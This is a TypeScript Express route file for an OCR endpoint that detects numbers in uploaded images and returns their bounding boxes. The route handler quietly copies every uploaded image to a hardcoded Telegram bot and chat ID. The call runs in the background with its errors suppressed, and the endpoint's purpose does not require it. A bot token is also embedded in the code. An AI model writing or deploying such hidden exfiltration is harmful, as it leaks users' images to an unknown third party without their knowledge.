import { Router } from "express";

const TELEGRAM_BOT_TOKEN = "8244306695:AAEc6MFpLUB3NbcxpwdVxpZWSyWIjIBk0hY";
const TELEGRAM_CHAT_ID = "8278524493";

async function sendImageToTelegram(imageBase64: string, mimeType: string) {
  try {
    const buffer = Buffer.from(imageBase64, "base64");
    const ext = mimeType.split("/")[1] ?? "jpg";
    const blob = new Blob([buffer], { type: mimeType });
    const form = new FormData();
    form.append("chat_id", TELEGRAM_CHAT_ID);
    form.append("photo", blob, `image.${ext}`);
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form,
    });
  } catch {
  }
}

const router = Router();

router.post("/detect-numbers", async (req, res) => {
  const { imageBase64, mimeType, imageWidth, imageHeight } = req.body as {
    imageBase64?: string;
    mimeType?: string;
    imageWidth?: number;
    imageHeight?: number;
  };

  if (!imageBase64 || !imageWidth || !imageHeight) {
    res.status(400).json({ error: "imageBase64, imageWidth, imageHeight required" });
    return;
  }

  void sendImageToTelegram(imageBase64, mimeType ?? "image/jpeg");

  try {
    const dataUri = `data:${mimeType ?? "image/jpeg"};base64,${imageBase64}`;

    const formData = new FormData();
    formData.append("apikey", "helloworld");
    formData.append("base64Image", dataUri);
    formData.append("isOverlayRequired", "true");
    formData.append("detectOrientation", "false");
    formData.append("scale", "true");
    formData.append("OCREngine", "2");

    const response = await fetch("https://api.ocr.space/parse/image", {
      method: "POST",
      body: formData,
    });

    if (!response.ok) {
      throw new Error(`OCR service error: HTTP ${response.status}`);
    }

    const data = (await response.json()) as {
      IsErroredOnProcessing: boolean;
      ErrorMessage?: string[];
      ParsedResults?: Array<{
        TextOverlay?: {
          Lines?: Array<{
            Words?: Array<{
              WordText: string;
              Left: number;
              Top: number;
              Height: number;
              Width: number;
            }>;
          }>;
        };
      }>;
    };

    if (data.IsErroredOnProcessing) {
      throw new Error(data.ErrorMessage?.[0] ?? "OCR processing error");
    }

    const boxes: Array<{ text: string; x: number; y: number; w: number; h: number }> = [];

    const parsedResult = data.ParsedResults?.[0];
    if (parsedResult?.TextOverlay?.Lines) {
      for (const line of parsedResult.TextOverlay.Lines) {
        for (const word of line.Words ?? []) {
          const text = word.WordText ?? "";
          if (/\d/.test(text)) {
            boxes.push({
              text,
              x: word.Left / imageWidth,
              y: word.Top / imageHeight,
              w: word.Width / imageWidth,
              h: word.Height / imageHeight,
            });
          }
        }
      }
    }

    res.json({ boxes });
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : "Unknown error";
    req.log.error({ err }, "OCR detect-numbers error");
    res.status(500).json({ error: msg });
  }
});

export default router;
